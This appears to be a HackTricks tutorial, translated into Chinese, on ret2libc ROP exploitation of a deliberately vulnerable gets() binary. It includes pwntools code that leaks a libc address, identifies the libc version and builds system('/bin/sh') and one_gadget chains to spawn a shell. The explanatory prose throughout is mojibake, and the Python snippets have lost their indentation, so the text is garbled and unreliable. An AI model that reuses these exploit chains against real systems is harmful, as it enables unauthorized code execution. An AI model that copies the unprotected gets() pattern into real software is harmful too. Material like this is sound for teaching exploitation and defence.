<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**æ¨ç‰¹**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# å¿«é€Ÿç®€ä»‹

1. **æ‰¾åˆ°**æº¢å‡º**åç§»é‡**
2. **æ‰¾åˆ°**`POP_RDI`ï¼Œ`PUTS_PLT`å’Œ`MAIN_PLT`çš„gadgets
3. ä½¿ç”¨å‰é¢çš„gadgetsæ¥**æ³„æ¼putsæˆ–å…¶ä»–libcå‡½æ•°çš„å†…å­˜åœ°å€**å¹¶**æ‰¾åˆ°libcç‰ˆæœ¬**ï¼ˆ[ä¸‹è½½åœ°å€](https://libc.blukat.me)ï¼‰
4. ä½¿ç”¨åº“æ¥**è®¡ç®—ROPå¹¶åˆ©ç”¨å®ƒ**

# å…¶ä»–æ•™ç¨‹å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¾›ç»ƒä¹ 

æœ¬æ•™ç¨‹å°†åˆ©ç”¨æ­¤æ•™ç¨‹ä¸­æä¾›çš„ä»£ç /äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ©ç”¨ï¼š[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
å…¶ä»–æœ‰ç”¨çš„æ•™ç¨‹ï¼š[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)ï¼Œ[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# ä»£ç 

æ–‡ä»¶åï¼š`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - æ³„éœ² LIBC æ¨¡æ¿

æˆ‘å°†ä½¿ç”¨æ­¤å¤„çš„ä»£ç æ¥åˆ¶ä½œæ¼æ´åˆ©ç”¨ã€‚\
ä¸‹è½½æ¼æ´åˆ©ç”¨å¹¶å°†å…¶æ”¾ç½®åœ¨ä¸æ˜“å—æ”»å‡»çš„äºŒè¿›åˆ¶æ–‡ä»¶ç›¸åŒçš„ç›®å½•ä¸­ï¼Œå¹¶å‘è„šæœ¬æä¾›æ‰€éœ€çš„æ•°æ®ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- æŸ¥æ‰¾åç§»é‡

åœ¨ç»§ç»­è¿›è¡Œæ¼æ´åˆ©ç”¨ä¹‹å‰ï¼Œæ¨¡æ¿éœ€è¦ä¸€ä¸ªåç§»é‡ã€‚å¦‚æœæ²¡æœ‰æä¾›åç§»é‡ï¼Œå®ƒå°†æ‰§è¡Œå¿…è¦çš„ä»£ç æ¥æŸ¥æ‰¾å®ƒï¼ˆé»˜è®¤æƒ…å†µä¸‹ `OFFSET = ""`ï¼‰ï¼š
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**æ‰§è¡Œ** `python template.py` å°†æ‰“å¼€ä¸€ä¸ªå¸¦æœ‰å´©æºƒç¨‹åºçš„ GDB æ§åˆ¶å°ã€‚åœ¨è¯¥ **GDB æ§åˆ¶å°** ä¸­æ‰§è¡Œ `x/wx $rsp` ä»¥è·å–å°†è¦è¦†ç›– RIP çš„ **å­—èŠ‚**ã€‚æœ€åï¼Œåœ¨ **python æ§åˆ¶å°** ä¸­è·å– **åç§»é‡**ï¼š
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

åœ¨æ‰¾åˆ°åç§»é‡ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º40ï¼‰åï¼Œä½¿ç”¨è¯¥å€¼æ›´æ”¹æ¨¡æ¿ä¸­çš„OFFSETå˜é‡ã€‚\
`OFFSET = "A" * 40`

å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ï¼š`pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` from GEFã€‚

# 2- å¯»æ‰¾Gadgets

ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ROP gadgetsã€‚è¿™äº›ROP gadgetså°†ç”¨äºè°ƒç”¨`puts`å‡½æ•°æ¥æ‰¾åˆ°æ­£åœ¨ä½¿ç”¨çš„**libc**ï¼Œç„¶åç”¨äº**å¯åŠ¨æœ€ç»ˆçš„æ”»å‡»**ã€‚
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`æ˜¯è°ƒç”¨**putså‡½æ•°**æ‰€éœ€çš„ã€‚\
`MAIN_PLT`æ˜¯åœ¨ä¸€æ¬¡äº¤äº’åå†æ¬¡è°ƒç”¨**ä¸»å‡½æ•°**ä»¥ä¾¿å†æ¬¡**åˆ©ç”¨**æº¢å‡ºï¼ˆæ— é™æ¬¡çš„åˆ©ç”¨ï¼‰ã€‚**å®ƒåœ¨æ¯ä¸ªROPçš„æœ«å°¾ç”¨äºå†æ¬¡è°ƒç”¨ç¨‹åº**ã€‚\
**POP\_RDI**ç”¨äºå°†**å‚æ•°**ä¼ é€’ç»™è¢«è°ƒç”¨çš„å‡½æ•°ã€‚

åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œæ‚¨ä¸éœ€è¦æ‰§è¡Œä»»ä½•æ“ä½œï¼Œå› ä¸ºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œpwntoolså°†æ‰¾åˆ°æ‰€æœ‰æ‰€éœ€çš„å†…å®¹ã€‚

# 3- æŸ¥æ‰¾LIBCåº“

ç°åœ¨æ˜¯æ—¶å€™æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨çš„**libcåº“**çš„ç‰ˆæœ¬äº†ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†**æ³„æ¼**å†…å­˜ä¸­**putså‡½æ•°**çš„**åœ°å€**ï¼Œç„¶åæˆ‘ä»¬å°†åœ¨è¯¥åœ°å€ä¸­æœç´¢putsç‰ˆæœ¬æ‰€åœ¨çš„**åº“ç‰ˆæœ¬**ã€‚
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‰§è¡Œä»£ç ä¸­æœ€é‡è¦çš„ä¸€è¡Œæ˜¯ï¼š
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
è¿™å°†å‘é€ä¸€äº›å­—èŠ‚ï¼Œç›´åˆ°**è¦†ç›–** **RIP** æˆä¸ºå¯èƒ½ï¼š`OFFSET`ã€‚\
ç„¶åï¼Œå®ƒå°†è®¾ç½®`POP_RDI`å°å·¥å…·çš„**åœ°å€**ï¼Œä»¥ä¾¿ä¸‹ä¸€ä¸ªåœ°å€ï¼ˆ`FUNC_GOT`ï¼‰å°†ä¿å­˜åœ¨**RDI**å¯„å­˜å™¨ä¸­ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬æƒ³è¦**è°ƒç”¨puts**ï¼Œå¹¶å°†`PUTS_GOT`çš„**åœ°å€**ä½œä¸ºputså‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ä¿å­˜åœ¨`PUTS_GOT`æŒ‡å‘çš„åœ°å€ä¸­ã€‚\
ä¹‹åï¼Œå°†è°ƒç”¨`PUTS_PLT`ï¼ˆå°†`PUTS_GOT`æ”¾å…¥**RDI**ä¸­ï¼‰ï¼Œå› æ­¤putså°†**è¯»å–**`PUTS_GOT`ä¸­çš„å†…å®¹ï¼ˆ**putså‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€**ï¼‰å¹¶å°†å…¶**æ‰“å°å‡ºæ¥**ã€‚\
æœ€åï¼Œå†æ¬¡è°ƒç”¨**mainå‡½æ•°**ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ©ç”¨æº¢å‡ºã€‚

è¿™æ ·ï¼Œæˆ‘ä»¬æˆåŠŸæ¬ºéª—äº†putså‡½æ•°ï¼Œä½¿å…¶**æ‰“å°å‡º**ä½äº**libc**åº“ä¸­çš„**putså‡½æ•°çš„å†…å­˜åœ°å€**ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬æœ‰äº†è¯¥åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥**æœç´¢æ­£åœ¨ä½¿ç”¨çš„libcç‰ˆæœ¬**ã€‚

![](<../../../.gitbook/assets/image (141).png>)

ç”±äºæˆ‘ä»¬æ­£åœ¨**åˆ©ç”¨**ä¸€äº›**æœ¬åœ°**äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤**ä¸éœ€è¦**æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨çš„**libc**ç‰ˆæœ¬ï¼ˆåªéœ€åœ¨`/lib/x86_64-linux-gnu/libc.so.6`ä¸­æ‰¾åˆ°è¯¥åº“ï¼‰ã€‚\
ä½†æ˜¯ï¼Œåœ¨è¿œç¨‹åˆ©ç”¨çš„æƒ…å†µä¸‹ï¼Œæˆ‘å°†åœ¨è¿™é‡Œè§£é‡Šå¦‚ä½•æ‰¾åˆ°å®ƒï¼š

## 3.1- æœç´¢libcç‰ˆæœ¬ï¼ˆ1ï¼‰

æ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸Šæœç´¢æ­£åœ¨ä½¿ç”¨çš„åº“ï¼š[https://libc.blukat.me/](https://libc.blukat.me)\
å®ƒè¿˜å…è®¸æ‚¨ä¸‹è½½å‘ç°çš„**libc**ç‰ˆæœ¬

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- æœç´¢libcç‰ˆæœ¬ï¼ˆ2ï¼‰

æ‚¨è¿˜å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

è¿™éœ€è¦ä¸€äº›æ—¶é—´ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚\
ä¸ºäº†ä½¿å…¶å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦ï¼š

* Libcç¬¦å·åç§°ï¼š`puts`
* æ³„æ¼çš„libcåœ°å€ï¼š`0x7ff629878690`

æˆ‘ä»¬å¯ä»¥æ‰¾å‡ºæœ€æœ‰å¯èƒ½ä½¿ç”¨çš„**libc**ç‰ˆæœ¬ã€‚
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
æˆ‘ä»¬æ‰¾åˆ°äº†2ä¸ªåŒ¹é…é¡¹ï¼ˆå¦‚æœç¬¬ä¸€ä¸ªä¸èµ·ä½œç”¨ï¼Œæ‚¨å¯ä»¥å°è¯•ç¬¬äºŒä¸ªï¼‰ã€‚ä¸‹è½½ç¬¬ä¸€ä¸ªï¼š
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
å°†`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so`ä¸­çš„libcå¤åˆ¶åˆ°æˆ‘ä»¬çš„å·¥ä½œç›®å½•ä¸­ã€‚

## 3.3- ç”¨äºæ³„æ¼çš„å…¶ä»–å‡½æ•°
```python
puts
printf
__libc_start_main
read
gets
```
# 4- å¯»æ‰¾åŸºäºlibcçš„åœ°å€å¹¶è¿›è¡Œåˆ©ç”¨

åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥çŸ¥é“ä½¿ç”¨çš„libcåº“ã€‚ç”±äºæˆ‘ä»¬æ­£åœ¨åˆ©ç”¨æœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘å°†åªä½¿ç”¨ï¼š`/lib/x86_64-linux-gnu/libc.so.6`

å› æ­¤ï¼Œåœ¨`template.py`çš„å¼€å¤´ï¼Œå°†**libc**å˜é‡æ›´æ”¹ä¸ºï¼š`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #å½“çŸ¥é“è·¯å¾„æ—¶è®¾ç½®åº“è·¯å¾„`

å°†**libcåº“çš„è·¯å¾„**æä¾›ç»™**exploitçš„å…¶ä½™éƒ¨åˆ†å°†è‡ªåŠ¨è®¡ç®—**ã€‚

åœ¨`get_addr`å‡½æ•°å†…ï¼Œå°†è®¡ç®—**libcçš„åŸºåœ°å€**ï¼š
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œ**æœ€ç»ˆçš„libcåŸºåœ°å€å¿…é¡»ä»¥00ç»“å°¾**ã€‚å¦‚æœä¸æ˜¯è¿™ç§æƒ…å†µï¼Œå¯èƒ½ä¼šæ³„æ¼é”™è¯¯çš„åº“ã€‚
{% endhint %}

ç„¶åï¼Œå‡½æ•°`system`çš„åœ°å€å’Œå­—ç¬¦ä¸²"/bin/sh"çš„**åœ°å€**å°†ä»**libcçš„åŸºåœ°å€**å’Œç»™å®šçš„**libcåº“**ä¸­è¿›è¡Œ**è®¡ç®—**ã€‚
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
æœ€åï¼Œå°†å‡†å¤‡å¥½çš„/bin/shæ‰§è¡Œæ¼æ´åˆ©ç”¨å‘é€å‡ºå»ï¼š
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
è®©æˆ‘ä»¬è§£é‡Šä¸€ä¸‹è¿™ä¸ªæœ€ç»ˆçš„ROPã€‚

æœ€åä¸€ä¸ªROPï¼ˆ`rop1`ï¼‰å†æ¬¡è°ƒç”¨äº†mainå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ©ç”¨æº¢å‡ºæ¼æ´ï¼ˆè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ`OFFSET`å†æ¬¡å‡ºç°çš„åŸå› ï¼‰ã€‚ç„¶åï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨`POP_RDI`æŒ‡å‘"/bin/sh"çš„åœ°å€ï¼ˆ`BINSH`ï¼‰ï¼Œå¹¶è°ƒç”¨systemå‡½æ•°ï¼ˆ`SYSTEM`ï¼‰ï¼Œå› ä¸º"/bin/sh"çš„åœ°å€å°†ä½œä¸ºå‚æ•°ä¼ é€’ã€‚

æœ€åï¼Œè°ƒç”¨exitå‡½æ•°çš„åœ°å€ï¼Œä»¥ä¾¿è¿›ç¨‹æ­£å¸¸é€€å‡ºï¼Œä¸ä¼šç”Ÿæˆä»»ä½•è­¦æŠ¥ã€‚

è¿™æ ·ï¼Œåˆ©ç”¨ç¨‹åºå°†æ‰§è¡Œä¸€ä¸ª"/bin/sh" shellã€‚

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- ä½¿ç”¨ONE_GADGET

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨[ONE_GADGET](https://github.com/david942j/one_gadget)æ¥è·å–ä¸€ä¸ªshellï¼Œè€Œä¸æ˜¯ä½¿ç”¨systemå’Œ"/bin/sh"ã€‚ONE_GADGETå°†åœ¨libcåº“ä¸­æ‰¾åˆ°ä¸€ç§åªä½¿ç”¨ä¸€ä¸ªROPåœ°å€å°±èƒ½è·å–shellçš„æ–¹æ³•ã€‚

ç„¶è€Œï¼Œé€šå¸¸ä¼šæœ‰ä¸€äº›é™åˆ¶æ¡ä»¶ï¼Œæœ€å¸¸è§ä¸”å®¹æ˜“é¿å…çš„æ˜¯`[rsp+0x30] == NULL`ã€‚ç”±äºæ‚¨å¯ä»¥æ§åˆ¶RSPä¸­çš„å€¼ï¼Œåªéœ€å‘é€æ›´å¤šçš„NULLå€¼å³å¯é¿å…è¿™ä¸ªé™åˆ¶æ¡ä»¶ã€‚

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOITæ–‡ä»¶

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°åˆ©ç”¨æ­¤æ¼æ´çš„æ¨¡æ¿ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# å¸¸è§é—®é¢˜

## æœªæ‰¾åˆ°MAIN_PLT = elf.symbols\['main']

å¦‚æœæ‰¾ä¸åˆ°"main"ç¬¦å·ã€‚é‚£ä¹ˆæ‚¨å¯ä»¥æŸ¥çœ‹ä¸»è¦ä»£ç çš„ä½ç½®ï¼š
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
å¹¶æ‰‹åŠ¨è®¾ç½®åœ°å€ï¼š
```python
MAIN_PLT = 0x401080
```
## æ‰¾ä¸åˆ°Putså‡½æ•°

å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨Putså‡½æ•°ï¼Œä½ åº”è¯¥æ£€æŸ¥æ˜¯å¦ä½¿ç”¨äº†

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

å¦‚æœåœ¨åˆ›å»ºæ‰€æœ‰çš„æ”»å‡»è½½è·ä¹‹åï¼Œä½ å‘ç°äº†è¿™ä¸ª**é”™è¯¯**ï¼š`sh: 1: %s%s%s%s%s%s%s%s: not found`

å°è¯•**ä»"/bin/sh"çš„åœ°å€ä¸­å‡å»64ä¸ªå­—èŠ‚**ï¼š
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
